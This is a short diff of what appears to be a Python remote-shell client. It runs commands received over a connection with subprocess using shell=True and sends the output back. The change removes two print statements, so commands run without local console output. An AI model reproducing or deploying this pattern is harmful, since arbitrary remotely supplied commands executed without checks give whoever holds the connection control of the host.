@@ -232,12 +232,10 @@ class Client(object):
             if len(data) > 0:
                 if data == b'tree':
                     data = b'tree /A'
-                print(data)
                 process = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 for line in iter(process.stdout.readline, ""):
                     if line == b'':
                         break
-                    print(line)
                     self.send(line.replace(b'\n', b''))
                     if self.receive() == '--q':
                         kill(process.pid)
